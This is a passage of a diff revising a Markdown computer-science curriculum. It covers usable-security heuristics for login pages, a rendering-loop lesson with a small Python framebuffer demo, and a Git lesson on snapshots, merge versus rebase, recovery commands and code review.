-**Usable security** applies the same list to auth and warnings. A TLS certificate error that says only "NET::ERR_CERT_AUTHORITY_INVALID" fails heuristic 9. A password field that forbids paste blocks password managers and *reduces* security. MFA that requires a phone on every low-risk action trains users to approve blindly.
+**USABLE SECURITY — SAME LIST, AUTH UI:**
 
 ```text
-Insecure-but-easy path          Secure-but-hard path
-----------------------          --------------------
-Reuse "Password1!"              Unique passphrase + manager
-Click through warning           Read warning, cancel, ask IT
-Approve every 2FA prompt        Approve only intentional logins
+Insecure-but-easy                 Secure-but-hard (today)
+-----------------                 ----------------------
+Reuse Password1!                  Unique passphrase + manager
+Click through cert warning        Read, cancel, ask IT
+Approve every 2FA prompt          Approve only intentional logins
 
 HCI goal: make the RIGHT column the easier column.
 ```
 
-**SMALL WORKING EXAMPLE**
+Bookstore login example: "wrong password" vs "user not found" trades enumeration risk against recovery clarity — pair vague errors with rate limits (69.2). Do not disable paste. Certificate errors need human language (heuristic 9), not only `NET::ERR_CERT_AUTHORITY_INVALID`. Step-up MFA for refunds; friction proportional to risk.
 
 ```text
-Heuristic review (5 minutes) - login page:
+Heuristic review (5 minutes) — bookstore login:
 
-[ ] Status: does failed login say "wrong password" vs "user not found"?
-    (leaks accounts if too specific; fails recovery if too vague)
-[ ] Errors: can the user recover without support?
-[ ] Prevention: is paste disabled? (usually a security anti-pattern)
-[ ] Consistency: does "Sign in" mean the same on mobile and desktop?
-[ ] Freedom: is there a clear "forgot password" that does not create
-    an account-enumeration oracle without rate limits?
+  [ ] Status: failed login recoverable without support?
+  [ ] Prevention: is paste disabled? (usually anti-pattern)
+  [ ] Consistency: "Sign in" same on mobile and desktop?
+  [ ] Freedom: forgot-password path exists and is rate-limited?
+  [ ] Errors: plain language + next step, not a stack trace
 
-Write one redesign note per failing item. That is an HCI deliverable.
+One redesign note per failing item is an HCI deliverable.
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+This phase is intentionally survey-depth: enough vocabulary to critique and redesign, not a UX career track.
+
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
-| Easy | List Nielsen's 10 heuristics from memory and give one app example each |
-| Medium | Heuristic-evaluate a settings page; file three issues with severity |
-| Hard | Redesign a 2FA enrollment flow so the secure path is the default path |
+| Easy | List five Nielsen heuristics and one bookstore UI example each |
+| Medium | Heuristic-evaluate a settings or checkout page; file three issues with severity |
+| Hard | Redesign MFA enrollment so the secure path is the default path |
 
-**WHY THE NEXT TOPIC IS NEEDED - Graphics:** Interfaces are not only forms and words - interactive software draws pixels at 60 Hz and reacts to input. Understanding the rendering/input loop is what lets you reason about games, visualizations, and why a UI feels "laggy." That is Phase 71.
+**WHAT THIS UNLOCKS NEXT:**
+
+Interfaces are not only forms — interactive software draws pixels on a budget and reacts to input. Understanding the rendering/input loop lets you reason about laggy UIs, visualizations, and simple games. That survey is Phase 71.
 
 ---
 
@@ -15198,84 +12456,93 @@ Write one redesign note per failing item. That is an HCI deliverable.
 
 ---
 
-
-
 # PHASE 71 - Graphics & Interactive Computing
 
 **Track:** Human-Centered Software / Systems
 
-**WHAT YOU WILL BE ABLE TO DO:** Explain a basic rendering and input loop - scene → transform → rasterize → framebuffer → display - and say why frame time and input latency feel like "responsiveness."
+**WHAT YOU WILL BE ABLE TO DO:** Explain a basic rendering and input loop — scene → transform → rasterize → framebuffer → display — and say why frame time and input latency feel like "responsiveness."
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 49 (CPU fetch-decode-execute - GPUs run a different parallel pipeline), Phase 50 (framebuffers live in memory), Phase 70 (what users perceive as lag is often a missed frame budget).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 49 — CPU vs parallel GPU work; Phase 70 — perceived lag is often a missed frame budget.
+
+**LEARNING RESOURCES:**
+
+- [The Programmable Graphics Pipeline (Mike Shah)](https://www.youtube.com/watch?v=kpA5X6eI6fM)
+- [LearnOpenGL — Hello Triangle](https://learnopengl.com/Getting-started/Hello-Triangle)
+- [An intro to modern OpenGL — The Graphics Pipeline](https://duriansoftware.com/joe/an-intro-to-modern-opengl.-chapter-1:-the-graphics-pipeline)
+- [A Jog Down the Pipeline (Udacity)](https://www.youtube.com/watch?v=kNrJTjKoYx4)
 
 ## 71.1 The Rendering and Input Loop
 
-**WHY YOU ARE LEARNING THIS:** Every interactive program you use - a game, a map, a data viz, even a scrolling feed - is a loop that (1) reads input, (2) updates simulation state, (3) draws a frame, and (4) waits for the display. Missing that structure makes "the UI is janky" an unsolvable mystery. This phase gives the CS vocabulary, not a full art degree.
+Secure, usable software still has to *present* itself. Every interactive program — a game, a map, a chart, even a scrolling feed — is a loop: read input, update state, draw a frame, present to the display. Missing that structure makes "the UI is janky" an unsolvable mystery. This is CS vocabulary, not a game-engine course.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
-
-- Pipeline theory: [The Programmable Graphics Pipeline (Mike Shah)](https://www.youtube.com/watch?v=kpA5X6eI6fM) *(Composio YouTube)*; [A Jog Down the Pipeline (Udacity)](https://www.youtube.com/watch?v=kNrJTjKoYx4)
-- Written: [LearnOpenGL - Hello Triangle](https://learnopengl.com/Getting-started/Hello-Triangle) *(Composio web)*; [An intro to modern OpenGL - The Graphics Pipeline](https://duriansoftware.com/joe/an-intro-to-modern-opengl.-chapter-1:-the-graphics-pipeline)
-- Interactive: any WebGL/Three.js demo in the browser - watch the frame rate counter while you resize and drag
-- Practice: implement the tiny CPU "framebuffer" below before touching a GPU API
-
-**STEP-BY-STEP EXPLANATION**
-
-A classical real-time loop:
+**THE LOOP:**
 
 ```text
 while running:
-    process_input()          # keyboard, mouse, touch, gamepad events
-    update(dt)               # simulate world for dt seconds
-    render(scene)            # produce pixels for this frame
-    present()                # swap buffers / vsync to display
+    process_input()   # keyboard, mouse, touch, gamepad
+    update(dt)        # simulate for dt seconds
+    render(scene)     # produce pixels
+    present()         # swap buffers / vsync
 ```
 
-**Rendering** (simplified pipeline):
+Miss the frame budget (often ~16.7 ms at 60 Hz) and motion stutters; delay between input and the frame that shows it and the UI feels laggy — Phase 70's "responsiveness" in milliseconds.
 
-1. **Vertices** - points in 3D (or 2D) with attributes (position, color, UV).
-2. **Vertex transform** - model → world → camera → clip space (matrices).
-3. **Rasterization** - turn triangles into fragments (candidate pixels).
-4. **Fragment shading** - color each fragment (textures, lights).
-5. **Framebuffer** - the image in memory; **swap** shows it on screen.
+**PIPELINE (SIMPLIFIED):**
 
-GPUs run steps 2-4 massively in parallel. That is why a GPU can fill millions of pixels while a CPU struggles - different machine for a different job (Phase 49's memory hierarchy still applies: bandwidth wins).
+1. **Vertices** — points with attributes (position, color, UV)  
+2. **Vertex transform** — model → world → camera → clip  
+3. **Rasterization** — triangles → fragments  
+4. **Fragment shading** — color (textures, lights)  
+5. **Framebuffer** — image in memory; **swap** shows it  
 
-**Latency budget:** at 60 FPS you have ~16.7 ms per frame. If input handling waits until after a 30 ms render, the UI feels sticky. Games and UIs both care; they just measure differently (input-to-photon vs animation smoothness).
-
-**SMALL WORKING EXAMPLE**
+GPUs run steps 2–4 massively in parallel (Phase 49). **Double buffering** draws off-screen while the previous frame displays; **vsync** can reduce tearing and add a frame of latency — a real trade-off.
 
 ```python playground=cs-phase-71-tiny-framebuffer
-# A 1D "framebuffer": each cell is a pixel brightness 0-9.
-# One "frame": clear, draw a moving block, print. That is a render loop.
+# Tiny CPU "framebuffer": bounce a block. Mental model only — not OpenGL.
 
-WIDTH = 40
+WIDTH, HEIGHT = 40, 12
+buf = [[" "] * WIDTH for _ in range(HEIGHT)]
+x, y, vx = 2, 5, 1
 
-def render(frame, x, width=5):
-    buf = ["."] * WIDTH
-    for i in range(x, min(WIDTH, x + width)):
-        buf[i] = "#"
-    return "".join(buf)
+def clear():
+    for row in buf:
+        for i in range(WIDTH):
+            row[i] = " "
 
-x = 0
-vx = 2
-for frame in range(12):
-    print(f"f{frame:02d} {render(frame, x)}")
+def draw_block(px, py):
+    for dy in range(3):
+        for dx in range(5):
+            r, c = py + dy, px + dx
+            if 0 <= r < HEIGHT and 0 <= c < WIDTH:
+                buf[r][c] = "#"
+
+def present():
+    print("\n".join("".join(row) for row in buf))
+    print("-" * WIDTH)
+
+for _ in range(8):
+    clear()
+    draw_block(x, y)
+    present()
     x += vx
     if x <= 0 or x + 5 >= WIDTH:
         vx = -vx
-# Mental model: update(x) then render(buf) then present(print).
+# update position → render into buf → present (print)
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+Survey honesty: real engines add scene graphs, materials, compute passes, and audio. You now know where "frame time" and "input lag" live so later systems talk stays grounded.
+
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
 | Easy | Draw the while-loop of input → update → render → present from memory |
 | Medium | Explain why vsync can reduce tearing but add input lag |
-| Hard | Follow LearnOpenGL Hello Triangle and name which pipeline stage each call configures |
+| Hard | Skim LearnOpenGL Hello Triangle; name which pipeline stage each major call configures |
 
-**WHY THE NEXT TOPIC IS NEEDED - Professional Software Engineering:** You can now build, connect, store, secure, and present software. Real teams also need shared history, tests, architecture, and a path to production - Story X, starting with Git & Collaboration at Phase 72.
+**WHAT THIS UNLOCKS NEXT:**
+
+Story IX made software *responsible*: you can map trust, use crypto correctly for developers, prove identity and authorize actions, defend the web attack surface, design for humans, and present interactive pixels. Building alone still breaks the moment more than one person (or one person across time) must change the same codebase safely. Shared history, review, and recovery are Story X — Git & Collaboration starts at Phase 72.
 
 ---
 
@@ -15287,362 +12554,166 @@ for frame in range(12):
 
 **Track:** Professional Software Engineering
 
-**WHAT YOU WILL BE ABLE TO DO:** Keep a safe collaboration history - review a pull request, resolve a merge conflict, and explain what a commit graph records that a shared folder never can.
+**WHAT YOU WILL BE ABLE TO DO:** Keep a safe collaboration history — review a pull request, resolve a merge conflict, and explain what a commit graph records that a shared folder never can.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 71 (you can already build and present software; teams need shared history before they need more features), Phase 48 (well-structured code makes reviewable diffs possible).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 71 — you can already build and present software; teams need shared history before they need more features. Phase 48 — well-structured code makes reviewable diffs possible.
+
+**LEARNING RESOURCES:**
+
+- [Learn Git Branching](https://learngitbranching.js.org/) — draw the commit graph as you type
+- [Pro Git (free book)](https://git-scm.com/book/en/v2) — especially Ch. 10 on internals
+- [Git MERGE vs REBASE (Academind)](https://www.youtube.com/watch?v=0chZFIZLR_0)
+- [Google's Code Review Developer Guide](https://google.github.io/eng-practices/review/)
+- Companion deep dive: `[Git.md](./Git.md)` Phases [2–4](./Git.md#phase-2) (state/internals), [6–10](./Git.md#phase-6) (merge/recovery/rebase), [14–15](./Git.md#phase-14) (team workflow) — plus matching [Git projects](../guides/Projects.md#git-and-git-workflows)
 
 ## 72.1 Version Control & Code Review
 
-> **Companion deep dive:** Keep this software-engineering context, then use `[Git.md](./Git.md)` Phases [2-4](./Git.md#phase-2) for state/internals, [6-10](./Git.md#phase-6) for merge/recovery/rebase, and [14-15](./Git.md#phase-14) for team workflow and repository trust. Build the matching [Git projects](../guides/Projects.md#git-and-git-workflows) rather than treating this section as a command reference.
+Story IX made software *responsible*. You can still break the moment more than one person — or one person across months — must change the same codebase safely. A shared folder with `final_v2_REAL.py` has no attributable history, no safe concurrent work, and no honest undo. Git is the shared history layer; this phase teaches the *software-engineering* model (snapshots, branches, review, recovery). For command-by-command internals, keep the companion `[Git.md](./Git.md)` open — do not treat this section as a paste of that course.
 
-**WHY YOU ARE LEARNING THIS:** The moment more than one person touches the same codebase, or a single person wants the ability to undo a mistake made days ago, "just editing the files" breaks down - changes overwrite each other, and there's no record of *what* changed, *when*, or *why*.
+**SNAPSHOTS, NOT DIFFS:**
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+Git does not primarily store “patches.” It stores **snapshots** in a content-addressed object database. Four object types matter:
 
-- Composio refresh: [How to Review a Pull Request in GitHub (CoderDave)](https://www.youtube.com/watch?v=lSnbOtw4izI) *(Composio YouTube)*; practice reviews on a real PR before memorizing more commands
-- Best animated explanation: [Git Internals by Building Git From Scratch](https://www.youtube.com/watch?v=MyvyqdQ3OjI) and [How Git Works Under the Hood (ByteByteGo)](https://www.youtube.com/watch?v=e9lnsKot_SQ) - the second is the fastest route to understanding that Git is a content-addressed object store rather than a diff tracker, which reframes every command afterwards
-- Alternative: [Git Explained in 100 Seconds (Fireship)](https://www.youtube.com/watch?v=hwP7WQkmECE) for the shape, then [Git MERGE vs REBASE (Academind)](https://www.youtube.com/watch?v=0chZFIZLR_0) for the one decision that causes the most confusion and the most team arguments
-- Another angle: [So You Think You Know Git (Scott Chacon, FOSDEM)](https://www.youtube.com/watch?v=aolI_Rz0ZqY) is by the author of Pro Git and covers the commands experienced engineers still do not know exist. For the deep version, [Deep Dive into Git (David Baumgold)](https://www.youtube.com/watch?v=1ffBJ4sVUb4) builds up from the object model
-- Interactive simulator: [Learn Git Branching](https://learngitbranching.js.org/) is outstanding and is the single best way to build a mental model, because it draws the commit graph as you type real commands and lets you break things safely. Pair it with [Git Visualizer](https://git-school.github.io/visualizing-git/) and [Oh My Git!](https://ohmygit.org/), an actual game about Git. Then run `git cat-file -p HEAD` in a real repository and walk from the commit to its tree to a blob by hand, which turns the object model from a diagram into something you have touched
-- Written documentation: [Pro Git](https://git-scm.com/book/en/v2) is free, complete, and chapter 10 on internals is the one that makes everything else obvious. [Atlassian's Git tutorials](https://www.atlassian.com/git/tutorials) are the best reference for workflows, [Conventional Commits](https://www.conventionalcommits.org/) for message discipline, and [Google's Code Review Developer Guide](https://google.github.io/eng-practices/review/) is the most useful document ever published on the human half of this section
-- GitHub implementation: [Build Your Own Git](https://wyag.thb.lt/) walks you through implementing Git in about 500 lines of Python, and [Gitlet](https://github.com/maryrosecook/gitlet) is a commented JavaScript implementation written specifically to be read. [libgit2](https://github.com/libgit2/libgit2) is the production-grade version
-- Practice platform: [Learn Git Branching](https://learngitbranching.js.org/) again for drills, [Git Katas](https://github.com/eficode-academy/git-katas) for repositories deliberately broken in specific ways so you practise recovery, and contributing a real pull request to any open-source project for the review half
+| Object | What it is |
+| ------ | ---------- |
+| **blob** | File contents with no name |
+| **tree** | Directory: names → blobs and trees |
+| **commit** | One tree + parent commit(s) + author, time, message |
+| **tag** | Annotated pointer (releases) |
 
-**STEP-BY-STEP EXPLANATION**
+Every object's identity is the hash of its own contents. Identical content is stored once; change one byte and hashes change all the way up — history is tamper-evident by construction.
 
-The single idea that makes Git comprehensible is that it does not store diffs. It stores **snapshots**, in a content-addressed object database, and there are only four object types. A **blob** is file contents with no name. A **tree** maps names to blobs and other trees, which is a directory. A **commit** points at one tree plus its parent commits, and carries the author, timestamp, and message. A **tag** is an annotated pointer. Every object's identity is the SHA hash of its own contents, which has a consequence worth stating explicitly: identical content is stored once no matter how many files or commits contain it, and any change anywhere produces a different hash all the way up the chain, so history is tamper-evident by construction.
-
-A **branch** is therefore not a copy of anything, it is a 41-byte file containing a commit hash. This is why branching in Git is instantaneous while it was expensive in older systems, and it explains why the operations feel so cheap. `HEAD` is a pointer to the current branch, and a detached HEAD simply means it points directly at a commit instead. Once you internalise that commits form a directed acyclic graph and branches are movable labels on it, the commands stop being incantations: `merge`, `rebase`, `reset`, and `cherry-pick` are all just different ways of moving labels and creating new nodes.
-
-The three areas a file can occupy are the other essential model. The **working directory** is what is on disk. The **staging area**, or index, is what will go into the next commit. The **repository** is committed history. `git add` moves working directory to index, `git commit` moves index to repository. The staging area is what most beginners resent and what experienced users rely on, because it lets you commit a coherent subset of your current mess, and `git add -p` to stage individual hunks is the tool that makes small, reviewable commits practical.
-
-**Merge versus rebase** is a genuine trade-off rather than a matter of taste. A merge creates a new commit with two parents, preserving exactly what happened including the fact that work was concurrent, at the cost of a graph that becomes hard to read. A rebase replays your commits on top of the new base, producing a linear history that is much easier to read and bisect, at the cost of rewriting commit hashes, which is why the rule is to never rebase commits that others have already pulled. The workable team convention is to rebase your own local feature branch to keep it clean and current, then merge it into the main branch, ideally as a squash if the intermediate commits were not meaningful.
-
-Three recovery facts are worth more than any workflow advice, because they remove the fear that makes people avoid Git's powerful commands. `git reflog` records every position HEAD has held for ninety days, so almost nothing is truly lost, including after a bad `reset --hard`. `git bisect` finds the commit that introduced a bug in logarithmic time by binary searching history, which connects directly to Phase 30.2 and turns "somewhere in the last 500 commits" into about nine checks. And the difference between `reset --soft`, `--mixed`, and `--hard` is exactly which of the three areas above gets rewound, which is why `--hard` is the only dangerous one.
-
-**Code review** is the human layer, and the research on it is unambiguous about what works. Small changes get real review and large ones get rubber-stamped, so the size of the diff is the strongest predictor of review quality. Reviews should be requested within a day and completed within a day, because a stale branch diverges. Comments should distinguish between what blocks a merge and what is a suggestion, since an undifferentiated pile of remarks is demoralising and slow. The reviewer's job is correctness, design fit, test adequacy, and readability for the next reader, and explicitly not formatting, which a linter and formatter should have settled before a human ever looked. And the most valuable habit is asking questions rather than issuing instructions, because the author usually has context the reviewer lacks.
-
-**BEFORE VS. AFTER**
-
-```text
-No version control -- shared files, manual "final_v2_REAL_final.py" copies
-        Problem: no safe way to combine two people's simultaneous changes,
-        no way to see what changed between versions, no way to revert
-        a bad change without hunting for a backup.
-
-Git (or any version control system)
-        Fix: every change is a recorded, attributable snapshot (a commit);
-        multiple people can work on independent branches and merge safely;
-        any past state can be inspected or restored.
-        Trade-off: a real workflow to learn (branching, merging, resolving
-        conflicts) in exchange for a complete, safe history of the project.
-```
-
-**Code review - the human layer on top of version control:** before a change merges into the main codebase, another engineer reviews it. This exists because a second set of eyes catches bugs, design issues, and knowledge gaps the original author is too close to the change to see themselves - and it spreads knowledge of the codebase across the team instead of concentrating it in one person.
-
-**PICTURE IT LIKE THIS**
-
-Git is a library where nothing is ever edited and everything is a new edition. Each page of text is filed by a fingerprint of its own contents rather than by a title, so two pages with identical text are physically the same page in the archive no matter how many books cite it. A book is not a bound object but a list of which pages it contains, and an edition is a note saying "this book, on this date, by this author, and here is the previous edition it descended from." Publishing a new edition never destroys the old one.
-
-A branch, in that library, is not a copy of the book. It is a sticky note on a shelf saying "the current edition of this line of work is edition number 4a7f." Moving your work forward means moving the sticky note. This is why creating a branch is instant: you wrote a sticky note, you did not photocopy a book.
-
-Merging is binding a new edition that credits two previous editions as its parents, so the record shows the two lines of work existed at the same time. Rebasing is re-typing your chapters as if they had always followed someone else's latest edition, producing a much more readable single line of descent, but they are genuinely new pages with new fingerprints, which is why doing it to editions other people already borrowed causes chaos. And the reflog is the front desk's log of every shelf position the sticky note has ever occupied, which is how you recover a book you thought you had thrown away.
-
-**Internal Working, what a commit actually is**
+A **branch** is not a copy of the project. It is a movable label (often a 41-byte file) holding one commit hash. That is why branching is cheap. `HEAD` points at the current branch (or, when detached, directly at a commit). Commits form a **DAG**; `merge`, `rebase`, `reset`, and `cherry-pick` are different ways of adding nodes and moving labels.
 
 ```text
 $ echo "hello" > greeting.txt && git add . && git commit -m "first"
 
-Four object types, all stored by the hash of their own contents:
+commit  a1b2c3d
+    tree      f4e5d6c
+    parent    (none)
+    message   "first"
+        |
+        v
+tree    f4e5d6c
+    100644 blob 9a2c1f8    greeting.txt
+        |
+        v
+blob  9a2c1f8  →  "hello\n"
 
-  commit  a1b2c3d
-      tree      f4e5d6c
-      parent    (none, this is the first)
-      author    you <you@example.com> 1754300000
-      message   "first"
-          |
-          v
-  tree    f4e5d6c
-      100644 blob 9a2c1f8    greeting.txt
-      040000 tree 3b7e2d1    src/
-          |                      |
-          v                      v
-  blob  9a2c1f8            tree 3b7e2d1
-      "hello\n"                100644 blob 7c4a9e2   main.py
-
-Verify it yourself, which is the exercise that makes it real:
-    git cat-file -p HEAD          -> shows the commit and its tree
-    git cat-file -p f4e5d6c       -> shows the tree's entries
-    git cat-file -p 9a2c1f8       -> prints "hello"
-
-Consequences of hashing contents rather than tracking diffs:
-  * identical file content is stored ONCE, however many commits
-    or paths reference it
-  * changing one byte in one file changes that blob's hash, which
-    changes its tree, which changes the commit -- so a commit hash
-    fixes the ENTIRE state of the project, tamper-evidently
-  * a branch is a 41-byte file holding one hash:
-        $ cat .git/refs/heads/main
-        a1b2c3d4e5f6...
-    which is why branching costs nothing at all
+Verify:  git cat-file -p HEAD
+         git cat-file -p HEAD^{tree}
+         git cat-file -p HEAD:greeting.txt
 ```
 
-**Internal Working, the three areas and what each command moves**
+**THREE AREAS:**
+
+| Area | Role |
+| ---- | ---- |
+| Working directory | Files on disk |
+| Staging area (index) | What the *next* commit will contain |
+| Repository | Committed history |
+
+`git add` moves working → index; `git commit` moves index → repository. The staging area lets you commit a coherent *subset* of a messy desk — `git add -p` stages hunks so reviews stay small.
 
 ```text
-  working directory        staging area (index)        repository
-   (files on disk)         (next commit's contents)    (history)
-        |                          |                        |
+  working directory        staging (index)           repository
+   (disk)                  (next commit)             (history)
         |----- git add ----------->|                        |
         |                          |----- git commit ------>|
-        |<---- git checkout -- <f> |                        |
-        |<---------------- git checkout <branch> -----------|
-
-  git reset variants -- the ONLY difference is how far back it rewinds:
-
-      reset --soft  HEAD~1   repo <- rewound.  index kept.  disk kept.
-                             "undo the commit, keep everything staged"
-      reset --mixed HEAD~1   repo <- rewound.  index reset. disk kept.
-                             (the default) "undo commit and unstage"
-      reset --hard  HEAD~1   repo, index, AND disk all rewound.
-                             "throw the work away"  <- the dangerous one
-
-  And even --hard is usually recoverable:
-      git reflog                      lists every position HEAD has held
-      git reset --hard HEAD@{2}       go back to where you were
-  The reflog keeps 90 days by default. This is why Git is far less
-  dangerous than it feels.
 ```
 
-**Internal Working, merge versus rebase on the same graph**
+**MERGE VS REBASE (REAL TRADE-OFF):**
 
 ```text
-STARTING POINT
+START
   main      A---B---C
                   \
-  feature          D---E        (you branched at B)
+  feature          D---E
 
-MERGE  (git checkout main && git merge feature)
-            A---B---C---M       M has TWO parents: C and E
-                  \      /      history records that D,E were
-                   D---E        developed concurrently with C
-  + true record of what happened, safe on shared branches
-  - the graph gets hard to read at scale, and bisect has more paths
+MERGE into main →  A---B---C---M   (M has two parents: C and E)
+  + true record of concurrency; safe on shared branches
+  - noisier graph; bisect has more paths
 
-REBASE  (git checkout feature && git rebase main)
-            A---B---C---D'---E'
-  D' and E' are NEW COMMITS with new hashes and the same changes,
-  replayed on top of C. The originals D and E are orphaned
-  (still in the reflog for 90 days).
-  + linear, readable history; bisect is trivial
-  - rewrites hashes. If anyone else pulled D or E, their history
-    and yours have now permanently diverged.
+REBASE feature onto main →  A---B---C---D'---E'
+  D'/E' are NEW commits (new hashes); D/E orphaned (reflog ~90 days)
+  + linear history; easy bisect
+  - never rebase commits others already pulled
 
-  THE RULE: rebase your own unpushed work freely. Never rebase
-  commits others have already pulled.
-
-SQUASH MERGE  (git merge --squash, or the GitHub button)
-            A---B---C---F       F contains all of D+E as one commit
-  + main's history is one commit per logical change
-  - the intermediate steps are gone. Good when they were "wip",
-    bad when they were meaningful and separately revertable.
-
-CONFLICT, and what the markers mean
-  <<<<<<< HEAD
-  price = compute(base)          <- what is on the branch you are ON
-  =======
-  price = compute(base, tax)     <- what is coming IN
-  >>>>>>> feature
-  Git could not decide because both sides changed the same lines.
-  Resolve by editing to the correct final state, then git add.
-  git checkout --ours / --theirs picks a whole side when appropriate.
+SQUASH → one commit F on main with all of D+E
+  + one logical change on main
+  - loses granular revert/blame of intermediate steps
 ```
 
-**Internal Working, git bisect as binary search over history**
+**Conflict markers** mean both sides edited the same lines:
 
 ```text
-"The test passed 500 commits ago and fails now. Which commit broke it?"
-
-Linear search: check up to 500 commits.
-Binary search:  log2(500) is about 9 checks.        (Phase 30.2)
-
-    $ git bisect start
-    $ git bisect bad                # current commit is broken
-    $ git bisect good v1.2.0        # this tag was fine
-
-    Git checks out the midpoint. You test. You answer.
-
-    [good]---------------?---------------[bad]      500 commits
-                        test
-    [good]------?------[bad]                        250
-              test
-    [good]--?--[bad]                                125
-           ...
-    -> "abc123 is the first bad commit"
-
-    $ git bisect run ./test.sh      # fully automated: exit 0 = good
-
-Every improvement in this roadmap compounds. Small, atomic commits
-make bisect precise, because the answer it gives you is a whole
-commit -- and a 40-file commit tells you much less than a 3-line one.
+<<<<<<< HEAD
+price = compute(base)          # branch you are ON
+=======
+price = compute(base, tax)     # incoming
+>>>>>>> feature
 ```
 
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
+Edit to the correct final state, then `git add`. Prefer understanding the *intent* of both sides over blindly `--ours` / `--theirs`.
 
+**RECOVERY WITHOUT PANIC:**
 
-| Operation                  | Cost                                                    | Why                                           |
-| -------------------------- | ------------------------------------------------------- | --------------------------------------------- |
-| Create a branch            | $O(1)$, writes 41 bytes                                 | a branch is a pointer, not a copy             |
-| Switch branches            | $O(\text{changed files})$                               | only files that differ are rewritten          |
-| Commit                     | $O(\text{changed files})$                               | unchanged blobs are already stored and reused |
-| `git log`                  | $O(\text{commits walked})$                              | walks the parent chain                        |
-| `git bisect`               | $O(\log n)$ tests                                       | binary search over history                    |
-| Clone                      | $O(\text{entire history})$                              | which is why shallow clones exist for CI      |
-| Merge                      | $O(\text{changes since the common ancestor})$           | three-way diff against the merge base         |
-| Storage of a 1-byte change | one new blob for the whole file, later delta-compressed | content addressing first, packfiles second    |
+| Tool | What it buys |
+| ---- | ------------ |
+| `git reflog` | Every position `HEAD` held (~90 days) — nearly nothing is truly lost after a bad `reset --hard` |
+| `git bisect` | Binary search history for the first bad commit (~log₂ *n* checks) — Phase 30.2 applied to time |
+| `reset --soft / --mixed / --hard` | How far the three areas rewind; only `--hard` throws disk work away |
+| `git revert` | New commit that undoes an old one — safe on *shared* history where rewrite is not |
 
+Atomic commits make bisect useful: a 40-file “fix everything” commit answers “which commit?” poorly.
 
+**CODE REVIEW AS A GATE:**
 
-| Choice                      | Gain                                              | Cost                                               |
-| --------------------------- | ------------------------------------------------- | -------------------------------------------------- |
-| Rebase feature branches     | linear, readable history, clean bisect            | rewrites hashes, unsafe once shared                |
-| Merge commits               | true record of concurrency, always safe           | noisy graph when the amount of work grows          |
-| Squash merges               | one commit per logical change                     | loses granular revert and blame detail             |
-| Trunk-based development     | tiny diffs, continuous integration, few conflicts | requires feature flags and real test coverage      |
-| Long-lived release branches | stable releases, controlled hotfixes              | painful merges, divergence, cherry-pick overhead   |
-| Small pull requests         | genuinely reviewed, fast to merge                 | more of them to manage                             |
-| Large pull requests         | fewer to manage                                   | reliably rubber-stamped, which defeats the purpose |
+Review quality collapses as diffs grow. Empirical habit: changes a colleague can hold in their head in ~20 minutes get real scrutiny; thousand-line PRs get rubber stamps. Ask for review within a day; finish review within a day — stale branches diverge. Separate **blocking** comments from suggestions. Review for correctness, design fit, tests, and readability — not formatting (linters own that). Prefer questions over edicts; the author usually has context you lack.
 
+A PR description that helps reviewers (labels inside the lesson body — **not** fake `##` lesson headings):
 
-The trade-off that matters most in practice is the last pair, and it is empirical rather than a matter of preference. Review quality falls off sharply somewhere around a few hundred changed lines, so a 2000-line pull request does not receive four times the scrutiny of a 500-line one, it receives less in total. The corollary is that the discipline worth building is not "review harder," it is decomposing work into changes a colleague can hold in their head in twenty minutes.
+**What changed and why** — two sentences; the reviewer has none of your context.
 
-**SMALL WORKING EXAMPLE**
+**How I verified it** — which tests, which manual check, which failure path.
 
-```bash
-# ---------------------------------------------------------------
-# 1. Prove the object model to yourself. This is the exercise that
-#    converts Git from memorised commands into something you know.
-# ---------------------------------------------------------------
-git init demo && cd demo
-echo "hello" > greeting.txt
-git add . && git commit -m "first commit"
+**Risk and rollback** — what breaks if this is wrong, and how to undo.
 
-git cat-file -p HEAD                 # the commit: tree, author, message
-git cat-file -p HEAD^{tree}          # the tree: names -> blob hashes
-git cat-file -p HEAD:greeting.txt    # the blob: "hello"
-git hash-object greeting.txt         # the same hash, computed from content
+**Reviewer, please focus on** — direct attention; undirected review finds typos, not bugs.
 
-cat .git/refs/heads/main             # a branch really is one hash
-git count-objects -v                 # how many objects exist so far
+Checklist habits: diff small enough to review; tests cover new behaviour *and* failure path; no formatting-only churn mixed with logic; commit messages explain *why* (the diff already shows *what*).
 
-# Identical content is stored once, whatever it is called:
-cp greeting.txt copy.txt
-git add . && git commit -m "same content, new name"
-git cat-file -p HEAD^{tree}          # two names, ONE blob hash
+**WORKED COLLABORATION SCENARIO:**
 
-# ---------------------------------------------------------------
-# 2. Small, coherent commits from a messy working directory.
-# ---------------------------------------------------------------
-git add -p              # stage individual hunks, not whole files
-git commit -v           # shows the diff in the editor while you
-                        # write the message, so the message is honest
-git diff                # working directory vs index
-git diff --staged       # index vs HEAD  (what you are about to commit)
+Two bookstore engineers diverge:
 
-# ---------------------------------------------------------------
-# 3. Merge versus rebase, run on a real graph so you can see both.
-# ---------------------------------------------------------------
-git switch -c feature
-echo "feature work" >> greeting.txt && git commit -am "feature: D"
-echo "more"        >> greeting.txt && git commit -am "feature: E"
-git switch main
-echo "main work" > other.txt && git add . && git commit -m "main: C"
+```text
+Ada on feature/checkout:   adds tax line to calculate_total
+Sam on main hotfix:        renames calculate_total → order_total
 
-git log --oneline --graph --all       # look at the divergence first
-
-git switch feature && git rebase main
-git log --oneline --graph --all       # linear now, and D/E have NEW hashes
-git reflog                            # the originals are still here
-
-# ---------------------------------------------------------------
-# 4. Recovery. Knowing these is what makes the rest safe to use.
-# ---------------------------------------------------------------
-git reflog                             # every position HEAD has held
-git reset --hard HEAD@{1}              # undo a bad reset
-git revert <sha>                       # new commit undoing an old one
-                                       # (safe on shared branches; reset is not)
-git restore --source=HEAD~3 path/file  # one file from an old commit
-git stash push -m "wip" && git stash pop
-git fsck --lost-found                  # find genuinely dangling commits
-
-# ---------------------------------------------------------------
-# 5. Find the commit that broke something, in log2(n) steps.
-# ---------------------------------------------------------------
-git bisect start
